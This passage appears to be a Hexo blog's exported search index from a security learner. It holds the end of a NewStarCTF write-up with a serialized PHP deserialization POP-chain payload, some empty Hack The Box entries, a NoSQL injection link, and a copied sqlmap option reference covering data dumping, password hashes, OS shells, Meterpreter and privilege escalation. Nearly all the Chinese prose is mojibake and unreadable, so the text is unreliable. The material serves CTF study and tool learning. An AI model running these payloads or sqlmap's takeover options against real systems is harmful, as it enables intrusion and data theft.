ä¸ºè¿™é‡ŒæŠŠeeeeé‡Œçš„å˜é‡å¤åˆ¶ä¸ºå®ä¾‹åŒ–çš„Startçš„ç±»ï¼Œæ‰€ä»¥å¦‚æœä»eeeeç±»ä¸ºå¼€å§‹åºåˆ—åŒ–çš„å…¥å£ä¹Ÿæ˜¯å¯ä»¥çš„</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">serialize</span>(<span class="variable">$start</span>);</span><br><span class="line"><span class="comment">//echo serialize($eeee);</span></span><br></pre></td></tr></table></figure><p>å¾—åˆ°åºåˆ—åŒ–æ•°æ®ï¼Œ<code>post</code>ä¼ å…¥å°±è¡Œ</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">O:<span class="number">5</span>:<span class="string">&quot;Start&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">4</span>:<span class="string">&quot;name&quot;</span>;O:<span class="number">3</span>:<span class="string">&quot;Sec&quot;</span>:<span class="number">2</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;Easy&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;cla&quot;</span>;N;&#125;s:<span class="number">3</span>:<span class="string">&quot;var&quot;</span>;O:<span class="number">4</span>:<span class="string">&quot;eeee&quot;</span>:<span class="number">1</span>:&#123;s:<span class="number">3</span>:<span class="string">&quot;obj&quot;</span>;r:<span class="number">1</span>;&#125;&#125;s:<span class="number">4</span>:<span class="string">&quot;func&quot;</span>;r:<span class="number">2</span>;&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">//O:4:&quot;eeee&quot;:1:&#123;s:3:&quot;obj&quot;;O:5:&quot;Start&quot;:2:&#123;s:4:&quot;name&quot;;O:3:&quot;Sec&quot;:2:&#123;s:3:&quot;obj&quot;;O:4:&quot;Easy&quot;:1:&#123;s:3:&quot;cla&quot;;N;&#125;s:3:&quot;var&quot;;r:1;&#125;s:4:&quot;func&quot;;r:3;&#125;&#125;</span></span><br></pre></td></tr></table></figure><p><img src="/2023/02/13/NewStarCTF-wp/image-20221027162117156.png" alt="image-20221027162117156"></p><hr><h1 id><a href="#" class="headerlink" title></a></h1>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> Game </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htbã®Machines</title>
      <link href="/2023/02/13/Machines/"/>
      <url>/2023/02/13/Machines/</url>
      
        <content type="html"><![CDATA[<h1 id="Machines"><a href="#Machines" class="headerlink" title="Machines"></a>Machines</h1>]]></content>
      
      
      <categories>
          
          <category> Hack the Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> htb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>htbã®Tracks</title>
      <link href="/2023/02/13/Tracks/"/>
      <url>/2023/02/13/Tracks/</url>
      
        <content type="html"><![CDATA[<h1 id="Tracks"><a href="#Tracks" class="headerlink" title="Tracks"></a>Tracks</h1>]]></content>
      
      
      <categories>
          
          <category> Hack the Box </category>
          
      </categories>
      
      
        <tags>
            
            <tag> htb </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>NoSQlæ³¨å…¥å­¦ä¹ </title>
      <link href="/2023/02/13/NoSQL/"/>
      <url>/2023/02/13/NoSQL/</url>
      
        <content type="html"><![CDATA[<p><code>åœ¨htbçš„ä¸€ä¸ªæœºå™¨ä¸Šé‡åˆ°çš„</code></p><p>[å­¦ä¹ å‚è€ƒæ–‡ç« ](<a href="https://book.hacktricks.xyz/pentesting-web/nosql-injection#basic-authentication-bypass">NoSQL injection - HackTricks</a>)</p><span id="more"></span>]]></content>
      
      
      <categories>
          
          <category> ç½‘ç»œå®‰å…¨å­¦ä¹  </category>
          
      </categories>
      
      
        <tags>
            
            <tag> web </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>sqlmapä½¿ç”¨æ€»ç»“</title>
      <link href="/2023/02/13/sqlmap/"/>
      <url>/2023/02/13/sqlmap/</url>
      
        <content type="html"><![CDATA[<h1 id="sqlmapä½¿ç”¨æ€»ç»“"><a href="#sqlmapä½¿ç”¨æ€»ç»“" class="headerlink" title="sqlmapä½¿ç”¨æ€»ç»“"></a>sqlmapä½¿ç”¨æ€»ç»“</h1><blockquote><p>åŸæ–‡ä½œè€…: Ywc</p><p>åŸæ–‡é“¾æ¥: <a href="https://yinwc.github.io/2018/07/05/sqlmap/">https://yinwc.github.io/2018/07/05/sqlmap/</a></p><p>å‘è¡¨æ—¥æœŸ: July 5th 2018, 1:20:40 pm</p><p>ç‰ˆæƒå£°æ˜:</p></blockquote><h2 id="é€‰é¡¹"><a href="#é€‰é¡¹" class="headerlink" title="é€‰é¡¹"></a>é€‰é¡¹</h2><p><code>â€“version</code> æ˜¾ç¤ºç¨‹åºçš„ç‰ˆæœ¬å·å¹¶é€€å‡º<br><code>-h, â€“help</code> æ˜¾ç¤ºæ­¤å¸®åŠ©æ¶ˆæ¯å¹¶é€€å‡º<br><code>-v VERBOSE</code> è¯¦ç»†çº§åˆ«ï¼š0-6ï¼ˆé»˜è®¤ä¸º1ï¼‰</p><h3 id="Target-ç›®æ ‡"><a href="#Target-ç›®æ ‡" class="headerlink" title="Target(ç›®æ ‡)"></a><strong>Target(ç›®æ ‡)</strong></h3><p>ä»¥ä¸‹è‡³å°‘éœ€è¦è®¾ç½®å…¶ä¸­ä¸€ä¸ªé€‰é¡¹ï¼Œè®¾ç½®ç›®æ ‡ URLã€‚</p><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-d DIRECT ç›´æ¥è¿æ¥åˆ°æ•°æ®åº“ã€‚</span></span><br><span class="line"><span class="deletion">-u URL, â€“url=URL ç›®æ ‡ URLã€‚</span></span><br><span class="line"><span class="deletion">-l LIST ä» Burp æˆ– WebScarab ä»£ç†çš„æ—¥å¿—ä¸­è§£æç›®æ ‡ã€‚</span></span><br><span class="line"><span class="deletion">-r REQUESTFILE ä»ä¸€ä¸ªæ–‡ä»¶ä¸­è½½å…¥ HTTP è¯·æ±‚ã€‚</span></span><br><span class="line"><span class="deletion">-g GOOGLEDORK å¤„ç† Google dork çš„ç»“æœä½œä¸ºç›®æ ‡ URLã€‚</span></span><br><span class="line"><span class="deletion">-c CONFIGFILE ä» INI é…ç½®æ–‡ä»¶ä¸­åŠ è½½é€‰é¡¹ã€‚</span></span><br></pre></td></tr></table></figure><h3 id="Requestï¼ˆè¯·æ±‚ï¼‰"><a href="#Requestï¼ˆè¯·æ±‚ï¼‰" class="headerlink" title="Requestï¼ˆè¯·æ±‚ï¼‰"></a><strong>Requestï¼ˆè¯·æ±‚ï¼‰</strong></h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šå¦‚ä½•è¿æ¥åˆ°ç›®æ ‡URLã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br></pre></td><td class="code"><pre><span class="line">â€“<span class="attribute">data</span>=DATA é€šè¿‡ POST å‘é€çš„æ•°æ®å­—ç¬¦ä¸²</span><br><span class="line">â€“<span class="attribute">cookie</span>=COOKIE HTTP Cookie å¤´</span><br><span class="line">â€“cookie-urlencode URL ç¼–ç ç”Ÿæˆçš„ cookie æ³¨å…¥</span><br><span class="line">â€“drop-set-cookie å¿½ç•¥å“åº”çš„ <span class="built_in">Set</span> â€“Cookie å¤´ä¿¡æ¯</span><br><span class="line">â€“<span class="attribute">user-agent</span>=AGENT æŒ‡å®š HTTP<span class="built_in"> User </span>â€“Agent å¤´</span><br><span class="line">â€“random-agent ä½¿ç”¨éšæœºé€‰å®šçš„ HTTP User-Agent å¤´</span><br><span class="line">â€“<span class="attribute">referer</span>=REFERER æŒ‡å®š HTTP Referer å¤´</span><br><span class="line">â€“<span class="attribute">headers</span>=HEADERS æ¢è¡Œåˆ†å¼€ï¼ŒåŠ å…¥å…¶ä»–çš„ HTTP å¤´</span><br><span class="line">â€“<span class="attribute">auth-type</span>=ATYPE HTTP èº«ä»½éªŒè¯ç±»å‹ï¼ˆåŸºæœ¬ï¼Œæ‘˜è¦æˆ–NTLMï¼‰(Basic, Digest <span class="keyword">or</span> NTLM)</span><br><span class="line">â€“<span class="attribute">auth-cred</span>=ACRED HTTP èº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·å:å¯†ç ï¼‰</span><br><span class="line">â€“<span class="attribute">auth-cert</span>=ACERT HTTP è®¤è¯è¯ä¹¦ï¼ˆkey_fileï¼Œcert_fileï¼‰</span><br><span class="line">â€“<span class="attribute">proxy</span>=PROXY ä½¿ç”¨ HTTP ä»£ç†è¿æ¥åˆ°ç›®æ ‡ URL</span><br><span class="line">â€“<span class="attribute">proxy-cred</span>=PCRED HTTP ä»£ç†èº«ä»½éªŒè¯å‡­æ®ï¼ˆç”¨æˆ·åï¼šå¯†ç ï¼‰</span><br><span class="line">â€“ignore-proxy å¿½ç•¥ç³»ç»Ÿé»˜è®¤çš„ HTTP ä»£ç†</span><br><span class="line">â€“<span class="attribute">delay</span>=DELAY åœ¨æ¯ä¸ª HTTP è¯·æ±‚ä¹‹é—´çš„å»¶è¿Ÿæ—¶é—´ï¼Œå•ä½ä¸ºç§’</span><br><span class="line">â€“<span class="attribute">timeout</span>=TIMEOUT ç­‰å¾…è¿æ¥è¶…æ—¶çš„æ—¶é—´ï¼ˆé»˜è®¤ä¸º30 ç§’ï¼‰</span><br><span class="line">â€“<span class="attribute">retries</span>=RETRIES è¿æ¥è¶…æ—¶åé‡æ–°è¿æ¥çš„æ—¶é—´ï¼ˆé»˜è®¤3ï¼‰</span><br><span class="line">â€“<span class="attribute">scope</span>=SCOPE ä»æ‰€æä¾›çš„ä»£ç†æ—¥å¿—ä¸­è¿‡æ»¤å™¨ç›®æ ‡çš„æ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">â€“<span class="attribute">safe-url</span>=SAFURL åœ¨æµ‹è¯•è¿‡ç¨‹ä¸­ç»å¸¸è®¿é—®çš„ url åœ°å€</span><br><span class="line">â€“<span class="attribute">safe-freq</span>=SAFREQ ä¸¤æ¬¡è®¿é—®ä¹‹é—´æµ‹è¯•è¯·æ±‚ï¼Œç»™å‡ºå®‰å…¨çš„ URL</span><br></pre></td></tr></table></figure><h3 id="Optimizationï¼ˆä¼˜åŒ–ï¼‰"><a href="#Optimizationï¼ˆä¼˜åŒ–ï¼‰" class="headerlink" title="Optimizationï¼ˆä¼˜åŒ–ï¼‰"></a><strong>Optimizationï¼ˆä¼˜åŒ–ï¼‰</strong></h3><p>è¿™äº›é€‰é¡¹å¯ç”¨äºä¼˜åŒ– sqlmap.py çš„æ€§èƒ½ã€‚</p><figure class="highlight isbl"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">-<span class="variable">o</span> å¼€å¯æ‰€æœ‰ä¼˜åŒ–å¼€å…³</span><br><span class="line">â€“<span class="variable">predict</span>-<span class="variable">output</span> é¢„æµ‹å¸¸è§çš„æŸ¥è¯¢è¾“å‡º</span><br><span class="line">â€“<span class="variable">keep</span>-<span class="variable">alive</span> ä½¿ç”¨æŒä¹…çš„ <span class="function"><span class="title">HTTP</span>(<span class="variable">S</span>) è¿æ¥</span></span><br><span class="line"><span class="function">â€“<span class="variable"><span class="literal">null</span></span>-<span class="variable">connection</span> ä»æ²¡æœ‰å®é™…çš„ <span class="variable">HTTP</span> å“åº”ä½“ä¸­æ£€ç´¢é¡µé¢é•¿åº¦</span></span><br><span class="line"><span class="function">â€“<span class="variable">threads</span>=<span class="variable">THREADS</span> æœ€å¤§çš„ <span class="title">HTTP</span>(<span class="variable">S</span>) è¯·æ±‚å¹¶å‘é‡ï¼ˆé»˜è®¤ä¸º<span class="number">1</span>ï¼‰</span></span><br></pre></td></tr></table></figure><h3 id="Injectionï¼ˆæ³¨å…¥ï¼‰"><a href="#Injectionï¼ˆæ³¨å…¥ï¼‰" class="headerlink" title="Injectionï¼ˆæ³¨å…¥ï¼‰"></a><strong>Injectionï¼ˆæ³¨å…¥ï¼‰</strong></h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šæµ‹è¯•å“ªäº›å‚æ•°ï¼Œæä¾›è‡ªå®šä¹‰çš„æ³¨å…¥ payloads å’Œå¯é€‰ç¯¡æ”¹è„šæœ¬ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">-p TESTPARAMETER å¯æµ‹è¯•çš„å‚æ•°</span><br><span class="line">â€“<span class="attribute">dbms</span>=DBMS å¼ºåˆ¶åç«¯çš„ DBMS ä¸ºæ­¤å€¼</span><br><span class="line">â€“<span class="attribute">os</span>=OS å¼ºåˆ¶åç«¯çš„ DBMS æ“ä½œç³»ç»Ÿä¸ºè¿™ä¸ªå€¼</span><br><span class="line">â€“<span class="attribute">prefix</span>=PREFIX æ³¨å…¥ payload å­—ç¬¦ä¸²å‰ç¼€</span><br><span class="line">â€“<span class="attribute">suffix</span>=SUFFIX æ³¨å…¥ payload å­—ç¬¦ä¸²åç¼€</span><br><span class="line">â€“<span class="attribute">tamper</span>=TAMPER ä½¿ç”¨ç»™å®šçš„è„šæœ¬ç¯¡æ”¹æ³¨å…¥æ•°æ®</span><br><span class="line">â€“tamper é€šè¿‡ç¼–ç ç»•è¿‡ WEB é˜²ç«å¢™ï¼ˆWAFï¼‰sqlmap.py é»˜è®¤ç”¨ char()</span><br><span class="line">â€“tamper æ’ä»¶æ‰€åœ¨ç›®å½•\sqlmap-dev\tamper</span><br></pre></td></tr></table></figure><h3 id="Detectionï¼ˆæ£€æµ‹ï¼‰"><a href="#Detectionï¼ˆæ£€æµ‹ï¼‰" class="headerlink" title="Detectionï¼ˆæ£€æµ‹ï¼‰"></a>Detectionï¼ˆæ£€æµ‹ï¼‰</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥æŒ‡å®šåœ¨ SQL ç›²æ³¨æ—¶å¦‚ä½•è§£æå’Œæ¯”è¾ƒ HTTP å“åº”é¡µé¢çš„å†…å®¹</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">â€“<span class="attribute">level</span>=LEVEL æ‰§è¡Œæµ‹è¯•çš„ç­‰çº§ï¼ˆ1-5ï¼Œé»˜è®¤ä¸º 1ï¼‰</span><br><span class="line">â€“<span class="attribute">risk</span>=RISK æ‰§è¡Œæµ‹è¯•çš„é£é™©ï¼ˆ0-3ï¼Œé»˜è®¤ä¸º 1ï¼‰</span><br><span class="line">â€“<span class="attribute">string</span>=STRING æŸ¥è¯¢æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…å­—ç¬¦ä¸²</span><br><span class="line">â€“<span class="attribute">regexp</span>=REGEXP æŸ¥è¯¢æœ‰æ•ˆæ—¶åœ¨é¡µé¢åŒ¹é…æ­£åˆ™è¡¨è¾¾å¼</span><br><span class="line">â€“text-only ä»…åŸºäºæ–‡æœ¬å†…å®¹æ¯”è¾ƒç½‘é¡µ</span><br></pre></td></tr></table></figure><p>è¿™äº›é€‰é¡¹å¯ç”¨äºè°ƒæ•´å…·ä½“çš„ SQL æ³¨å…¥æµ‹è¯•</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â€“technique<span class="operator">=</span>TECH SQL æ³¨å…¥æŠ€æœ¯æµ‹è¯•ï¼ˆé»˜è®¤ BEUSTï¼‰</span><br><span class="line">Techniquesï¼ˆæŠ€å·§ï¼‰ï¼š</span><br><span class="line">â€“technique /*æµ‹è¯•æŒ‡å®šæ³¨å…¥ç±»å‹\ä½¿ç”¨çš„æŠ€æœ¯</span><br></pre></td></tr></table></figure><p>ä¸åŠ å‚æ•°é»˜è®¤æµ‹è¯•æ‰€æœ‰æ³¨å…¥æŠ€æœ¯ï¼š</p><p>ä¸åŠ å‚æ•°é»˜è®¤æµ‹è¯•æ‰€æœ‰æ³¨å…¥æŠ€æœ¯ï¼š</p><figure class="highlight avrasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="symbol">B:</span> åŸºäºå¸ƒå°”çš„ SQL ç›²æ³¨</span><br><span class="line"><span class="symbol">E:</span> åŸºäºæ˜¾é”™ sql æ³¨å…¥</span><br><span class="line"><span class="symbol">U:</span> åŸºäº UNION æ³¨å…¥</span><br><span class="line"><span class="symbol">S:</span> å å±‚ sql æ³¨å…¥</span><br><span class="line"><span class="symbol">T:</span> åŸºäºæ—¶é—´ç›²æ³¨</span><br></pre></td></tr></table></figure><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â€“<span class="attribute">time-sec</span>=TIMESEC DBMS å“åº”çš„å»¶è¿Ÿæ—¶é—´ï¼ˆé»˜è®¤ä¸º 5 ç§’ï¼‰</span><br><span class="line">â€“<span class="attribute">union-cols</span>=UCOLS å®šåˆ—èŒƒå›´ç”¨äºæµ‹è¯• UNION æŸ¥è¯¢æ³¨å…¥</span><br><span class="line">â€“<span class="attribute">union-char</span>=UCHAR ç”¨äºæš´åŠ›çŒœè§£åˆ—æ•°çš„å­—ç¬¦</span><br></pre></td></tr></table></figure><h3 id="Fingerprintï¼ˆæŒ‡çº¹ï¼‰"><a href="#Fingerprintï¼ˆæŒ‡çº¹ï¼‰" class="headerlink" title="Fingerprintï¼ˆæŒ‡çº¹ï¼‰"></a>Fingerprintï¼ˆæŒ‡çº¹ï¼‰</h3><figure class="highlight diff"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="deletion">-f, â€“fingerprint æ‰§è¡Œæ£€æŸ¥å¹¿æ³›çš„ DBMS ç‰ˆæœ¬æŒ‡çº¹</span></span><br></pre></td></tr></table></figure><h3 id="Enumerationï¼ˆæšä¸¾ï¼‰"><a href="#Enumerationï¼ˆæšä¸¾ï¼‰" class="headerlink" title="Enumerationï¼ˆæšä¸¾ï¼‰"></a>Enumerationï¼ˆæšä¸¾ï¼‰</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ—ä¸¾åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„ä¿¡æ¯ã€è¡¨ä¸­çš„ç»“æ„å’Œæ•°æ®ã€‚æ­¤å¤–ï¼Œæ‚¨è¿˜å¯ä»¥è¿è¡Œæ‚¨è‡ªå·±çš„ SQL è¯­å¥ã€‚</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><span class="line">-b, â€“banner æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ ‡è¯†</span><br><span class="line">â€“<span class="keyword">current</span>-<span class="keyword">user</span> æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰ç”¨æˆ·</span><br><span class="line">â€“<span class="keyword">current</span>-db æ£€ç´¢æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå½“å‰æ•°æ®åº“</span><br><span class="line">â€“<span class="keyword">is</span>-dba æ£€æµ‹ DBMS å½“å‰ç”¨æˆ·æ˜¯å¦ DBA</span><br><span class="line">â€“users æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·</span><br><span class="line">â€“passwords æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·å¯†ç å“ˆå¸Œ</span><br><span class="line">â€“<span class="keyword">privileges</span> æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„æƒé™</span><br><span class="line">â€“roles æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿç”¨æˆ·çš„è§’è‰²</span><br><span class="line">â€“dbs æšä¸¾æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ•°æ®åº“</span><br><span class="line">â€“<span class="keyword">tables</span> æšä¸¾ DBMS æ•°æ®åº“ä¸­çš„è¡¨</span><br><span class="line">â€“<span class="keyword">columns</span> æšä¸¾ DBMS æ•°æ®åº“è¡¨åˆ—</span><br><span class="line">â€“dump è½¬å‚¨æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„æ•°æ®åº“ä¸­çš„è¡¨é¡¹</span><br><span class="line">â€“dump-<span class="keyword">all</span> è½¬å‚¨æ‰€æœ‰çš„ DBMS æ•°æ®åº“è¡¨ä¸­çš„æ¡ç›®</span><br><span class="line">â€“<span class="keyword">search</span> æœç´¢åˆ—ï¼Œè¡¨å’Œ/æˆ–æ•°æ®åº“åç§°</span><br><span class="line">-D DB è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“å</span><br><span class="line">-T TBL è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“è¡¨</span><br><span class="line">-C COL è¦è¿›è¡Œæšä¸¾çš„æ•°æ®åº“åˆ—</span><br><span class="line">-U <span class="keyword">USER</span> ç”¨æ¥è¿›è¡Œæšä¸¾çš„æ•°æ®åº“ç”¨æˆ·</span><br><span class="line">â€“<span class="keyword">exclude</span>-sysdbs æšä¸¾è¡¨æ—¶æ’é™¤ç³»ç»Ÿæ•°æ®åº“</span><br><span class="line">â€“start=LIMITSTART ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºè¿›å…¥æ£€ç´¢</span><br><span class="line">â€“stop=LIMITSTOP æœ€åæŸ¥è¯¢çš„è¾“å‡ºè¿›å…¥æ£€ç´¢</span><br><span class="line">â€“first=FIRSTCHAR ç¬¬ä¸€ä¸ªæŸ¥è¯¢è¾“å‡ºå­—çš„å­—ç¬¦æ£€ç´¢</span><br><span class="line">â€“last=LASTCHAR æœ€åæŸ¥è¯¢çš„è¾“å‡ºå­—å­—ç¬¦æ£€ç´¢</span><br><span class="line">â€“<span class="keyword">sql</span>-query=QUERY è¦æ‰§è¡Œçš„ <span class="keyword">SQL</span> è¯­å¥</span><br><span class="line">â€“<span class="keyword">sql</span>-shell æç¤ºäº¤äº’å¼ <span class="keyword">SQL</span> çš„ shell</span><br></pre></td></tr></table></figure><h3 id="Brute-force-è›®åŠ›"><a href="#Brute-force-è›®åŠ›" class="headerlink" title="Brute force(è›®åŠ›)"></a>Brute force(è›®åŠ›)</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è¿è¡Œè›®åŠ›æ£€æŸ¥ã€‚</p><figure class="highlight armasm"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â€“<span class="meta">common</span>-tables æ£€æŸ¥å­˜åœ¨å…±åŒè¡¨</span><br><span class="line">â€“<span class="meta">common</span>-columns æ£€æŸ¥å­˜åœ¨å…±åŒåˆ—</span><br></pre></td></tr></table></figure><h3 id="User-defined-function-injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰"><a href="#User-defined-function-injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰" class="headerlink" title="User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰"></a>User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚</p><p>User-defined function injectionï¼ˆç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°æ³¨å…¥ï¼‰ï¼š<br>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨æ¥åˆ›å»ºç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°ã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">â€“udf-inject æ³¨å…¥ç”¨æˆ·è‡ªå®šä¹‰å‡½æ•°</span><br><span class="line">â€“<span class="attribute">shared-lib</span>=SHLIB å…±äº«åº“çš„æœ¬åœ°è·¯å¾„</span><br></pre></td></tr></table></figure><h3 id="File-system-accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰"><a href="#File-system-accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰" class="headerlink" title="File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰"></a>File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚</p><p>File system accessï¼ˆè®¿é—®æ–‡ä»¶ç³»ç»Ÿï¼‰ï¼š<br>è¿™äº›é€‰é¡¹å¯ä»¥è¢«ç”¨æ¥è®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ–‡ä»¶ç³»ç»Ÿã€‚</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">â€“<span class="attribute">file-read</span>=RFILE ä»åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿè¯»å–æ–‡ä»¶</span><br><span class="line">â€“<span class="attribute">file-write</span>=WFILE ç¼–è¾‘åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿæ–‡ä»¶ç³»ç»Ÿä¸Šçš„æœ¬åœ°æ–‡ä»¶</span><br><span class="line">â€“<span class="attribute">file-dest</span>=DFILE åç«¯çš„æ•°æ®åº“ç®¡ç†ç³»ç»Ÿå†™å…¥æ–‡ä»¶çš„ç»å¯¹è·¯å¾„</span><br></pre></td></tr></table></figure><h3 id="Operating-system-accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰"><a href="#Operating-system-accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰" class="headerlink" title="[*]Operating system accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰"></a>[*]Operating system accessï¼ˆæ“ä½œç³»ç»Ÿè®¿é—®ï¼‰</h3><p>è¿™äº›é€‰é¡¹å¯ä»¥ç”¨äºè®¿é—®åç«¯æ•°æ®åº“ç®¡ç†ç³»ç»Ÿçš„åº•å±‚æ“ä½œç³»ç»Ÿã€‚</p><figure class="highlight lua"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">â€“<span class="built_in">os</span>-cmd=OSCMD æ‰§è¡Œæ“ä½œç³»ç»Ÿå‘½ä»¤</span><br><span class="line">â€“<span class="built_in">os</span>-shell äº¤äº’å¼çš„æ“ä½œç³»ç»Ÿçš„ shell</span><br><span class="line">â€“<span class="built_in">os</span>-pwn è·å–ä¸€ä¸ª OOB shellï¼Œmeterpreter æˆ– VNC</span><br><span class="line">â€“<span class="built_in">os</span>-smbrelay ä¸€é”®è·å–ä¸€ä¸ª OOB shellï¼Œmeterpreter æˆ– VNC</span><br><span class="line">â€“<span class="built_in">os</span>-bof å­˜å‚¨è¿‡ç¨‹ç¼“å†²åŒºæº¢å‡ºåˆ©ç”¨</span><br><span class="line">â€“priv-esc æ•°æ®åº“è¿›ç¨‹ç”¨æˆ·æƒé™æå‡</span><br><span 